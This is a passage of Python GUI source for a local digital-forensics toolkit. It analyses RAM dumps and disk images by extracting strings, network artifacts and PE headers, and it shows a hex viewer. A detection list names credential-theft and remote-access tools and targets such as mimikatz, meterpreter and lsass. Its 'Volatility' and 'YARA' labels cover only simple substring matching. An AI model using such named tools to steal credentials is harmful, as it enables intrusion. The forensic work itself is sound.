        self.hex_offset_entry = tk.Entry(hex_top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=14)
        self.hex_offset_entry.pack(side="left", padx=6, ipady=2)
        tk.Button(hex_top, text="🔍 IR", command=self.goto_hex_offset, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat").pack(side="left", padx=4)
        
        self.hex_text = scrolledtext.ScrolledText(self.tab_hex, font=("Consolas", 9), bg="#0a0a0a", fg="#00ff88", relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="none")
        self.hex_text.pack(fill="both", expand=True, padx=6, pady=6)
        self.hex_text.insert("1.0", "Hex Viewer - selecione item ou insira offset")
        
        btns = tk.Frame(self, bg=BG)
        btns.pack(fill="x", padx=10, pady=(0,10))
        for txt, cmd in [("🧹 LIMPAR", self.clear_all), ("💾 TXT", self.export_txt), ("📊 JSON", self.export_json), ("📋 COPIAR", self.copy_selected)]:
            b = tk.Button(btns, text=txt, command=cmd)
            b.pack(side="left", padx=4, ipady=5, fill="x", expand=True)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))
    
    def select_file(self):
        path = filedialog.askopenfilename(title="Selecionar dump RAM", filetypes=[("Dumps RAM", "*.raw *.mem *.dmp *.bin *.img *.vmem"), ("Todos", "*.*")])
        if not path:
            return
        self.file_path = path
        self.file_size = os.path.getsize(path)
        self.path_var.set(os.path.basename(path))
        self.stats_label.configure(text=f"Arquivo: {os.path.basename(path)} | {self.file_size/1024/1024:.2f} MB | Calculando hashes...")
        threading.Thread(target=self.calc_hashes_thread, daemon=True).start()
    
    def calc_hashes_thread(self):
        try:
            import math
            md5 = hashlib.md5()
            sha256 = hashlib.sha256()
            with open(self.file_path, "rb") as f:
                for chunk in iter(lambda: f.read(1024*1024), b""):
                    md5.update(chunk)
                    sha256.update(chunk)
            self.hashes = {"md5": md5.hexdigest(), "sha256": sha256.hexdigest()}
            with open(self.file_path, "rb") as f:
                sample = f.read(1024*1024)
                freq = {}
                for b in sample:
                    freq[b] = freq.get(b, 0) + 1
                ent = 0
                for c in freq.values():
                    p = c / len(sample)
                    ent -= p * math.log2(p) if p>0 else 0
                self.entropy = ent
            self.after(0, self.update_hashes_ui)
        except Exception as e:
            self.after(0, lambda: self.stats_label.configure(text=f"Erro: {e}"))
    
    def update_hashes_ui(self):
        txt = f"══ IMAGEINFO ══\nArquivo: {self.file_path}\nTamanho: {self.file_size} ({self.file_size/1024/1024:.2f} MB)\nMD5: {self.hashes.get('md5','')}\nSHA256: {self.hashes.get('sha256','')}\nEntropia: {self.entropy:.4f}/8.0\n\nClique ANALISAR."
        self.info_text.delete("1.0", "end")
        self.info_text.insert("1.0", txt)
        self.stats_label.configure(text=f"Hash OK | Entropia:{self.entropy:.2f} | Pronto ANALISAR")
    
    def start_analysis(self):
        if not self.file_path or not os.path.exists(self.file_path):
            messagebox.showwarning("Aviso", "Selecione dump.")
            return
        if self.is_analyzing:
            return
        self.is_analyzing = True
        self.btn_analyze.configure(text="⏳ ANALISANDO...", state="disabled")
        for tree in [self.ps_tree, self.net_tree, self.str_tree, self.reg_tree, self.mal_tree]:
            try:
                tree.delete(*tree.get_children())
            except:
                pass
        self.strings_ascii = []
        threading.Thread(target=self.analysis_worker, daemon=True).start()
    
    def analysis_worker(self):
        try:
            import mmap, re
            min_len = 6
            max_strings = 60000
            ascii_pat = re.compile(rb'[ -~]{%d,}' % min_len)
            uni_pat = re.compile(rb'(?:[\x20-\x7E]\x00){%d,}' % min_len)
            all_strings = []
            with open(self.file_path, "rb") as f:
                with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                    size = len(mm)
                    os_guess = "Desconhecido"
                    sample = mm[:min(5*1024*1024, size)]
                    if b"Windows" in sample:
                        os_guess = "Windows"
                    elif b"Linux" in sample:
                        os_guess = "Linux"
                    self.os_guess = os_guess
                    count = 0
                    for m in ascii_pat.finditer(mm):
                        if count >= max_strings:
                            break
                        off = m.start()
                        try:
                            s = m.group().decode('ascii', errors='ignore')
                            if len(s) >= min_len:
                                all_strings.append((off, "ASCII", s))
                                count += 1
                        except:
                            pass
                    for m in uni_pat.finditer(mm):
                        if count >= max_strings:
                            break
                        off = m.start()
                        try:
                            raw = m.group()
                            s = raw.decode('utf-16le', errors='ignore')
                            if len(s) >= min_len:
                                all_strings.append((off, "UNICODE", s))
                                count += 1
                        except:
                            pass
                    # PE scan
                    pe_offsets = []
                    idx = 0
                    while len(pe_offsets) < 1000:
                        idx = mm.find(b'MZ', idx)
                        if idx == -1:
                            break
                        try:
                            if idx + 0x40 < size:
                                e_lfanew = int.from_bytes(mm[idx+0x3C:idx+0x40], 'little')
                                if 0 < e_lfanew < 1024 and idx + e_lfanew + 6 < size:
                                    if mm[idx+e_lfanew:idx+e_lfanew+2] == b'PE':
                                        pe_offsets.append(idx)
                        except:
                            pass
                        idx += 2
                    self.pe_headers = pe_offsets
                    # Process map
                    proc_map = {}
                    ips_found = {}
                    urls_found = {}
                    emails_found = {}
                    reg_found = {}
                    mal = []
                    for off, typ, s in all_strings:
                        low = s.lower()
                        for proc in self.KNOWN_PROCS:
                            if proc.lower() in low and len(s) < 260:
                                if proc not in proc_map:
                                    proc_map[proc] = []
                                proc_map[proc].append(off)
                        # IPs
                        if "." in s:
                            import re as re2
                            for ip_m in re2.finditer(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', s):
                                ip = ip_m.group()
                                try:
                                    parts = ip.split(".")
                                    if all(0 <= int(p) <= 255 for p in parts):
                                        if ip not in ips_found:
                                            ips_found[ip] = []
                                        ips_found[ip].append(off)
                                except:
                                    pass
                        if "http" in low:
                            import re as re2
                            for url_m in re2.finditer(r'https?://[^\s]{4,200}', s, re2.IGNORECASE):
                                url = url_m.group()[:200]
                                if url not in urls_found:
                                    urls_found[url] = []
                                urls_found[url].append(off)
                        if "@" in s:
                            import re as re2
                            for em_m in re2.finditer(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', s):
                                em = em_m.group()[:100]
                                if em not in emails_found:
                                    emails_found[em] = []
                                emails_found[em].append(off)
                        if "HKEY_" in s or "SOFTWARE\\" in s:
                            if len(s) < 300 and ("\\" in s):
                                if s not in reg_found:
                                    reg_found[s] = []
                                reg_found[s].append(off)
                        # malware sigs
                        for family, sigs in self.SUSPICIOUS_SIGS.items():
                            for sig in sigs:
                                if sig.lower() in low and len(s) < 200:
                                    mal.append((family.upper(), off, f"YARA:{sig}", s[:80]))
                                    break
                    self.strings_ascii = all_strings
                    self.processes_found = proc_map
                    self.network_artifacts["ips"] = ips_found
                    self.network_artifacts["urls"] = urls_found
                    self.network_artifacts["emails"] = emails_found
                    self.registry_keys = reg_found
                    self.malware_indicators = mal
            self.after(0, self.populate_ui_after_analysis)
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Erro análise", str(e)))
            self.after(0, lambda: self.btn_analyze.configure(text="🔍 ANALISAR (Volatility)", state="normal"))
            self.is_analyzing = False
    
    def populate_ui_after_analysis(self):
        self.is_analyzing = False
        self.btn_analyze.configure(text="🔍 ANALISAR (Volatility)", state="normal")
        info = f"══ IMAGEINFO ══\nArquivo: {self.file_path}\nTamanho: {self.file_size/1024/1024:.2f} MB\nMD5: {self.hashes.get('md5','')}\nSHA256: {self.hashes.get('sha256','')}\nEntropia: {self.entropy:.4f}\nOS: {self.os_guess}\n\nStrings: {len(self.strings_ascii)}\nProcessos: {len(self.processes_found)}\nPE: {len(self.pe_headers)}\nIPs: {len(self.network_artifacts['ips'])} URLs: {len(self.network_artifacts['urls'])}\nRegistry: {len(self.registry_keys)}\nAlertas: {len(self.malware_indicators)}\n"
        self.info_text.delete("1.0", "end")
        self.info_text.insert("1.0", info)
        for proc, offs in sorted(self.processes_found.items(), key=lambda x: len(x[1]), reverse=True):
            self.ps_tree.insert("", "end", values=(hex(offs[0]), proc, "Windows" if ".exe" in proc else "Linux", len(offs), f"{len(offs)} ocorrências"))
        for ip, offs in list(self.network_artifacts["ips"].items())[:200]:
            self.net_tree.insert("", "end", values=("IP", ip, hex(offs[0]), f"{len(offs)}x"))
        for url, offs in list(self.network_artifacts["urls"].items())[:200]:
            self.net_tree.insert("", "end", values=("URL", url[:80], hex(offs[0]), f"{len(offs)}x"))
        for em, offs in list(self.network_artifacts["emails"].items())[:200]:
            self.net_tree.insert("", "end", values=("EMAIL", em, hex(offs[0]), f"{len(offs)}x"))
        for off, typ, s in self.strings_ascii[:5000]:
            self.str_tree.insert("", "end", values=(hex(off), typ, len(s), s[:120]))
        for key, offs in list(self.registry_keys.items())[:500]:
            self.reg_tree.insert("", "end", values=("REG", key[:120], hex(offs[0])))
        for alert, off, typ, detail in self.malware_indicators[:500]:
            self.mal_tree.insert("", "end", values=(alert, hex(off), typ, detail[:120]))
        for off in self.pe_headers[:100]:
            self.mal_tree.insert("", "end", values=("PE", hex(off), "MZ+PE", f"Executável em RAM"))
        self.stats_label.configure(text=f"OK | Strings:{len(self.strings_ascii)} Procs:{len(self.processes_found)} PE:{len(self.pe_headers)}")
        self.nb.select(self.tab_pslist)
    
    def filter_pslist(self):
        q = self.ps_filter.get().lower().strip()
        for item in self.ps_tree.get_children():
            vals = self.ps_tree.item(item, "values")
            if q in " ".join(map(str, vals)).lower() or not q:
                self.ps_tree.reattach(item, "", "end")
            else:
                self.ps_tree.detach(item)
    
    def filter_strings(self):
        q = self.str_filter.get().lower().strip()
        self.str_tree.delete(*self.str_tree.get_children())
        shown = 0
        for off, typ, s in self.strings_ascii:
            if q and q not in s.lower() and q not in hex(off).lower():
                continue
            if shown >= 5000:
                break
            self.str_tree.insert("", "end", values=(hex(off), typ, len(s), s[:120]))
            shown += 1
    
    def on_ps_select(self):
        sel = self.ps_tree.selection()
        if not sel:
            return
        vals = self.ps_tree.item(sel[0], "values")
        try:
            off = int(vals[0], 16)
            self.show_hex_at_offset(off)
        except:
            pass
    
    def on_net_select(self):
        sel = self.net_tree.selection()
        if not sel:
            return
        vals = self.net_tree.item(sel[0], "values")
        try:
            off = int(vals[2], 16)
            self.show_hex_at_offset(off)
        except:
            pass
    
    def on_str_select(self):
        sel = self.str_tree.selection()
        if not sel:
            return
        vals = self.str_tree.item(sel[0], "values")
        try:
            off = int(vals[0], 16)
            self.show_hex_at_offset(off)
        except:
            pass
    
    def show_hex_at_offset(self, offset):
        if not self.file_path:
            return
        try:
            with open(self.file_path, "rb") as f:
                f.seek(max(0, offset-64))
                data = f.read(256)
                start = max(0, offset-64)
                lines = []
                for i in range(0, len(data), 16):
                    chunk = data[i:i+16]
                    hex_part = " ".join(f"{b:02x}" for b in chunk)
                    ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
                    addr = start + i
                    marker = " <--" if start + i <= offset < start + i + 16 else ""
                    lines.append(f"{addr:08x}  {hex_part:<48}  |{ascii_part}|{marker}")
                self.hex_text.delete("1.0", "end")
                self.hex_text.insert("1.0", f"Offset {hex(offset)} ({offset}):\n" + "\n".join(lines))
                self.nb.select(self.tab_hex)
        except Exception as e:
            self.hex_text.delete("1.0", "end")
            self.hex_text.insert("1.0", f"Erro: {e}")
    
    def goto_hex_offset(self):
        txt = self.hex_offset_entry.get().strip()
        if not txt:
            return
        try:
            off = int(txt, 16) if txt.lower().startswith("0x") else int(txt)
            self.show_hex_at_offset(off)
        except Exception as e:
            messagebox.showerror("Offset", str(e))
    
    def yara_scan(self):
        if not self.strings_ascii:
            messagebox.showwarning("YARA", "Analise primeiro.")
            return
        hits = []
        for off, typ, s in self.strings_ascii[:30000]:
            low = s.lower()
            for family, sigs in self.SUSPICIOUS_SIGS.items():
                for sig in sigs:
                    if sig.lower() in low and len(s) < 300:
                        hits.append((family, sig, off, s[:80]))
        self.mal_tree.delete(*self.mal_tree.get_children())
        for family, sig, off, ctx in hits[:500]:
            self.mal_tree.insert("", "end", values=(family.upper(), hex(off), f"YARA:{sig}", ctx))
        self.nb.select(self.tab_malfind)
        messagebox.showinfo("YARA", f"{len(hits)} hits")
    
    def clear_all(self):
        for tree in [self.ps_tree, self.net_tree, self.str_tree, self.reg_tree, self.mal_tree]:
            try:
                tree.delete(*tree.get_children())
            except:
                pass
        self.info_text.delete("1.0", "end")
        self.hex_text.delete("1.0", "end")
    
    def export_txt(self):
        if not self.file_path:
            return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT","*.txt")])
        if not path:
            return
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"VOLATILITY REPORT\nFile: {self.file_path}\nSize: {self.file_size}\nMD5: {self.hashes.get('md5','')}\nOS: {self.os_guess}\n\nProcesses: {len(self.processes_found)}\n")
            for proc, offs in self.processes_found.items():
                f.write(f"  {proc}: {len(offs)}\n")
        messagebox.showinfo("Exportado", path)
    
    def export_json(self):
        if not self.file_path:
            return
        path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON","*.json")])
        if not path:
            return
        import json as js
        data = {
            "file": self.file_path,
            "size": self.file_size,
            "hashes": self.hashes,
            "os_guess": self.os_guess,
            "processes": {k: len(v) for k, v in self.processes_found.items()},
            "pe_headers": [hex(x) for x in self.pe_headers[:200]],
            "ips": list(self.network_artifacts["ips"].keys())[:200],
        }
        with open(path, "w", encoding="utf-8") as f:
            js.dump(data, f, indent=2)
        messagebox.showinfo("Exportado", path)
    
    def copy_selected(self):
        for tree in [self.ps_tree, self.net_tree, self.str_tree, self.reg_tree, self.mal_tree]:
            sel = tree.selection()
            if sel:
                vals = tree.item(sel[0], "values")
                txt = " | ".join(map(str, vals))
                self.clipboard_clear()
                self.clipboard_append(txt)
                return




class AutopsyTool(ToolWindow):
    """Autopsy-like - Investigação forense de sistemas de ficheiros, discos e imagens"""
    
    FILE_SIGS = {
        "JPEG": (b"\xFF\xD8\xFF", b"\xFF\xD9", ".jpg"),
        "PNG": (b"\x89PNG\r\n\x1A\n", b"IEND", ".png"),
        "PDF": (b"%PDF", b"%%EOF", ".pdf"),
        "ZIP": (b"PK\x03\x04", None, ".zip"),
        "RAR": (b"Rar!\x1A\x07\x00", None, ".rar"),
        "7Z": (b"7z\xBC\xAF\x27\x1C", None, ".7z"),
        "GIF": (b"GIF87a", None, ".gif"),
        "GIF89": (b"GIF89a", None, ".gif"),
        "BMP": (b"BM", None, ".bmp"),
        "MP3": (b"ID3", None, ".mp3"),
        "MP4_FTYP": (b"ftyp", None, ".mp4"),
        "EXE_MZ": (b"MZ", None, ".exe"),
        "ELF": (b"\x7FELF", None, ".elf"),
        "SQLITE": (b"SQLite format 3\x00", None, ".db"),
        "REGISTRY_HIVE": (b"regf", None, ".hive"),
    }
    
    SUSPICIOUS_NAMES = [
        "mimikatz", "psexec", "cobalt", "beacon", "meterpreter", 
        "ransom", "decrypt", "keylog", "bitcoin", "wallet.dat",
        "password", "shadow", "sam", "ntds.dit", "lsass", "credentials"
    ]
    
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Autopsy - Análise Forense de Disco", "1320x900")
        self.file_path = None
        self.is_folder = False
        self.file_size = 0
        self.hashes = {}
        self.entropy = 0.0
        self.fs_type = "Desconhecido"
        self.partition_info = []
        self.file_list = []
        self.deleted_list = []
        self.timeline_list = []
        self.carved_files = []
        self.strings_ascii = []
        self.is_analyzing = False
        self.tsk_available = False
        self.os_guess = "Desconhecido"
        
        try:
            import pytsk3
            self.tsk_available = True
        except:
            self.tsk_available = False
        
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=10, pady=8)
        
        tk.Label(top, text="EVIDÊNCIA:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.path_var = tk.StringVar(value="Nenhuma imagem/pasta selecionada")
        self.path_entry = tk.Entry(top, textvariable=self.path_var, font=(FONT_MONO, 8), bg=PANEL_BG, fg=TEXT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=38, state="readonly")
        self.path_entry.pack(side="left", padx=6, ipady=4)
        
        b_img = tk.Button(top, text="💿 IMAGEM", command=self.select_image, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
        b_img.pack(side="left", padx=2)
        style_button(b_img)
        
        b_folder = tk.Button(top, text="📁 PASTA", command=self.select_folder, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
        b_folder.pack(side="left", padx=2)
        style_button(b_folder)
        
        b_analyze = tk.Button(top, text="🔍 ANALISAR (Autopsy)", command=self.start_analysis, bg="#0a1f15", fg="#00ff88", font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=12, pady=5, cursor="hand2")
        b_analyze.pack(side="left", padx=6)
        self.btn_analyze = b_analyze
        
        b_ext = tk.Button(top, text="🦴 SleuthKit", command=self.check_sleuthkit, bg="#1a150a", fg="#ffb700", font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
        b_ext.pack(side="left", padx=2)
        
        b_autopsy_ext = tk.Button(top, text="🔗 Autopsy Ext.", command=self.launch_external_autopsy, bg="#0f0a1f", fg="#cc88ff", font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
        b_autopsy_ext.pack(side="left", padx=2)
        
        stats_bar = tk.Frame(self, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        stats_bar.pack(fill="x", padx=10, pady=(0,6))
        tsk_status = "pytsk3 OK" if self.tsk_available else "pytsk3 não instalado (modo fallback)"
        self.stats_label = tk.Label(stats_bar, text=f"{tsk_status} | Selecione imagem .E01/.raw/.img/.dd/.vmdk ou pasta para análise forense | Análise local", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8), anchor="w")
        self.stats_label.pack(fill="x", padx=8, pady=4)
        
        tk.Label(self, text="⚠ FORENSE: Use apenas em evidências que possui legalmente. Dumps contêm dados sensíveis. Mantenha chain of custody. Integra com Autopsy/SleuthKit externo se instalado.", bg="#1a150a", fg="#ffb700", font=(FONT_MONO, 7, "bold"), wraplength=1290, justify="left").pack(fill="x", padx=10, pady=(0,6), ipady=3)
        
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[8,5], font=(FONT_MONO, 7, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])
        
        self.nb = ttk.Notebook(self)
        self.nb.pack(fill="both", expand=True, padx=10, pady=(0,6))
        
        self.tab_info = tk.Frame(self.nb, bg=BG)
        self.tab_files = tk.Frame(self.nb, bg=BG)
        self.tab_timeline = tk.Frame(self.nb, bg=BG)
        self.tab_deleted = tk.Frame(self.nb, bg=BG)
        self.tab_carving = tk.Frame(self.nb, bg=BG)
        self.tab_strings = tk.Frame(self.nb, bg=BG)
        self.tab_hashes = tk.Frame(self.nb, bg=BG)
        self.tab_hex = tk.Frame(self.nb, bg=BG)
        self.tab_search = tk.Frame(self.nb, bg=BG)
        
        self.nb.add(self.tab_info, text="  INFO / IMAGEINFO  ")
        self.nb.add(self.tab_files, text="  FILESYSTEM / LS  ")
        self.nb.add(self.tab_timeline, text="  TIMELINE  ")
        self.nb.add(self.tab_deleted, text="  DELETED / UNALLOC  ")
        self.nb.add(self.tab_carving, text="  CARVING / SIGS  ")
        self.nb.add(self.tab_strings, text="  STRINGS / KEYWORDS  ")
        self.nb.add(self.tab_hashes, text="  HASHSET  ")
        self.nb.add(self.tab_hex, text="  HEX VIEWER  ")
        self.nb.add(self.tab_search, text="  SEARCH  ")
        
        self.info_text = scrolledtext.ScrolledText(self.tab_info, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.info_text.pack(fill="both", expand=True, padx=6, pady=6)
        self.info_text.insert("1.0", 
            "══ AUTOPSY-LIKE // OSINIT ══\n\n"
            "Ferramenta forense para investigação de sistemas de ficheiros.\n\n"
            "Funcionalidades:\n"
            "- IMAGEINFO: tamanho, hashes MD5/SHA256, entropia, tipo FS (NTFS/FAT/ext4), partições\n"
            "- FILESYSTEM: lista ficheiros, pastas, atributos, timestamps MAC, tipo, deleted flag\n"
            "- TIMELINE: ordena por Modified/Accessed/Created - deteta atividade suspeita\n"
            "- DELETED: recupera ficheiros apagados, $Recycle.Bin, unallocated space\n"
            "- CARVING: procura por assinaturas (JPEG, PNG, PDF, ZIP, DB) em espaço não alocado\n"
            "- STRINGS: extrai strings ASCII/Unicode, IPs, URLs, emails, keywords suspeitas\n"
            "- HASHSET: calcula hashes, compara com known bad (opcional)\n"
            "- HEX: visualizador hexadecimal de ficheiros/imagem\n"
            "- SEARCH: procura keywords no filesystem\n\n"
            "Modos:\n"
            "1. Com pytsk3 (pip install pytsk3): análise forense real de imagens .raw/.E01/.img\n"
            "2. Sem pytsk3: modo fallback - analisa pasta montada + carving + strings na imagem bruta\n"
            "3. Integração externa: se Autopsy/SleuthKit instalado, botão 'SleuthKit' executa fls/mmls\n\n"
            "Formatos suportados: .raw, .dd, .img, .E01 (com pyewf), .vmdk, .vhd, .iso, pastas\n\n"
            "Selecione uma imagem ou pasta e clique ANALISAR."
        )
        
        files_top = tk.Frame(self.tab_files, bg=BG)
        files_top.pack(fill="x", padx=6, pady=4)
        tk.Label(files_top, text="Filtro:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.files_filter = tk.Entry(files_top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=25)
        self.files_filter.pack(side="left", padx=6, ipady=2)
        self.files_filter.bind("<KeyRelease>", lambda e: self.filter_files())
        tk.Label(files_top, text="Ext:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(10,0))
        self.ext_filter_var = tk.StringVar(value="todas")
        ext_combo = ttk.Combobox(files_top, textvariable=self.ext_filter_var, values=["todas", ".jpg/.png", ".pdf/.docx", ".exe/.dll", ".db/.sqlite", ".log/.txt", "suspeitos"], width=16, state="readonly")
        ext_combo.pack(side="left", padx=6)
        ext_combo.bind("<<ComboboxSelected>>", lambda e: self.filter_files())
        
        files_frame = tk.Frame(self.tab_files, bg=PANEL_BG)
        files_frame.pack(fill="both", expand=True, padx=6, pady=4)
        self.files_tree = ttk.Treeview(files_frame, columns=("Nome", "Caminho", "Tamanho", "Tipo", "Modificado", "Estado", "Info"), show="headings", height=18)
        for c,w in zip(("Nome", "Caminho", "Tamanho", "Tipo", "Modificado", "Estado", "Info"), [140, 260, 80, 70, 130, 80, 200]):
            self.files_tree.heading(c, text=c)
            self.files_tree.column(c, width=w)
        self.files_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb_f = ttk.Scrollbar(files_frame, orient="vertical", command=self.files_tree.yview)
        vsb_f.pack(side="right", fill="y")
        self.files_tree.configure(yscrollcommand=vsb_f.set)
        self.files_tree.bind("<<TreeviewSelect>>", lambda e: self.on_file_select())
        self.files_tree.bind("<Double-Button-1>", lambda e: self.extract_selected_file())
        
        tl_frame = tk.Frame(self.tab_timeline, bg=PANEL_BG)
        tl_frame.pack(fill="both", expand=True, padx=6, pady=6)
        self.timeline_tree = ttk.Treeview(tl_frame, columns=("Data", "Ação", "Ficheiro", "Caminho", "Tamanho", "Tipo"), show="headings", height=18)
        for c,w in zip(("Data", "Ação", "Ficheiro", "Caminho", "Tamanho", "Tipo"), [150, 60, 160, 300, 80, 100]):
            self.timeline_tree.heading(c, text=c)
            self.timeline_tree.column(c, width=w)
        self.timeline_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb_tl = ttk.Scrollbar(tl_frame, orient="vertical", command=self.timeline_tree.yview)
        vsb_tl.pack(side="right", fill="y")
        self.timeline_tree.configure(yscrollcommand=vsb_tl.set)
        
        del_frame = tk.Frame(self.tab_deleted, bg=PANEL_BG)
        del_frame.pack(fill="both", expand=True, padx=6, pady=6)
        self.deleted_tree = ttk.Treeview(del_frame, columns=("Nome", "Caminho Orig", "Tamanho", "Estado", "Motivo", "Recuperável"), show="headings", height=18)
        for c,w in zip(("Nome", "Caminho Orig", "Tamanho", "Estado", "Motivo", "Recuperável"), [150, 300, 80, 80, 200, 90]):
            self.deleted_tree.heading(c, text=c)
            self.deleted_tree.column(c, width=w)
        self.deleted_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb_d = ttk.Scrollbar(del_frame, orient="vertical", command=self.deleted_tree.yview)
        vsb_d.pack(side="right", fill="y")
        self.deleted_tree.configure(yscrollcommand=vsb_d.set)
        self.deleted_tree.bind("<<TreeviewSelect>>", lambda e: self.on_deleted_select())
        
        carv_top = tk.Frame(self.tab_carving, bg=BG)
        carv_top.pack(fill="x", padx=6, pady=4)
        tk.Label(carv_top, text="Assinaturas para carving:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.carv_label = tk.Label(carv_top, text="0 ficheiros carved", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.carv_label.pack(side="right", padx=6)
        
        carv_frame = tk.Frame(self.tab_carving, bg=PANEL_BG)
        carv_frame.pack(fill="both", expand=True, padx=6, pady=4)
        self.carving_tree = ttk.Treeview(carv_frame, columns=("Offset", "Tipo", "Tamanho Est", "Header", "Footer", "Ext", "Info"), show="headings", height=18)
        for c,w in zip(("Offset", "Tipo", "Tamanho Est", "Header", "Footer", "Ext", "Info"), [90, 70, 90, 120, 80, 50, 300]):
            self.carving_tree.heading(c, text=c)
            self.carving_tree.column(c, width=w)
        self.carving_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb_c = ttk.Scrollbar(carv_frame, orient="vertical", command=self.carving_tree.yview)
        vsb_c.pack(side="right", fill="y")
        self.carving_tree.configure(yscrollcommand=vsb_c.set)
        self.carving_tree.bind("<<TreeviewSelect>>", lambda e: self.on_carved_select())
        
        str_top = tk.Frame(self.tab_strings, bg=BG)
        str_top.pack(fill="x", padx=6, pady=4)
        tk.Label(str_top, text="Filtro:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.str_filter = tk.Entry(str_top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=22)
        self.str_filter.pack(side="left", padx=6, ipady=2)
        self.str_filter.bind("<Return>", lambda e: self.filter_strings())
        tk.Button(str_top, text="🔍 FILTRAR", command=self.filter_strings, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat").pack(side="left", padx=4)
        self.str_count_label = tk.Label(str_top, text="0 strings", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.str_count_label.pack(side="right", padx=6)
        
        str_frame = tk.Frame(self.tab_strings, bg=PANEL_BG)
        str_frame.pack(fill="both", expand=True, padx=6, pady=4)
        self.str_tree = ttk.Treeview(str_frame, columns=("Offset", "Tipo", "Tamanho", "String", "Contexto"), show="headings", height=18)
        for c,w in zip(("Offset", "Tipo", "Tamanho", "String", "Contexto"), [90, 60, 60, 400, 220]):
            self.str_tree.heading(c, text=c)
            self.str_tree.column(c, width=w)
        self.str_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb_s = ttk.Scrollbar(str_frame, orient="vertical", command=self.str_tree.yview)
        vsb_s.pack(side="right", fill="y")
        self.str_tree.configure(yscrollcommand=vsb_s.set)
        self.str_tree.bind("<<TreeviewSelect>>", lambda e: self.on_string_select())
        
        hash_frame = tk.Frame(self.tab_hashes, bg=PANEL_BG)
        hash_frame.pack(fill="both", expand=True, padx=6, pady=6)
        self.hash_tree = ttk.Treeview(hash_frame, columns=("Ficheiro", "MD5", "SHA1", "SHA256", "Tamanho", "Nota"), show="headings", height=18)
        for c,w in zip(("Ficheiro", "MD5", "SHA1", "SHA256", "Tamanho", "Nota"), [150, 200, 200, 200, 80, 120]):
            self.hash_tree.heading(c, text=c)
            self.hash_tree.column(c, width=w)
        self.hash_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb_h = ttk.Scrollbar(hash_frame, orient="vertical", command=self.hash_tree.yview)
        vsb_h.pack(side="right", fill="y")
        self.hash_tree.configure(yscrollcommand=vsb_h.set)
        
        hex_top = tk.Frame(self.tab_hex, bg=BG)
        hex_top.pack(fill="x", padx=6, pady=4)
        tk.Label(hex_top, text="Offset (hex/dec):", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.hex_offset_entry = tk.Entry(hex_top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=16)
        self.hex_offset_entry.pack(side="left", padx=6, ipady=2)
        self.hex_offset_entry.insert(0, "0")
        tk.Button(hex_top, text="🔍 IR", command=self.goto_hex_offset, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat").pack(side="left", padx=4)
        tk.Button(hex_top, text="📄 HEX DO FICHEIRO SEL.", command=self.hex_selected_file, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat").pack(side="left", padx=6)
        
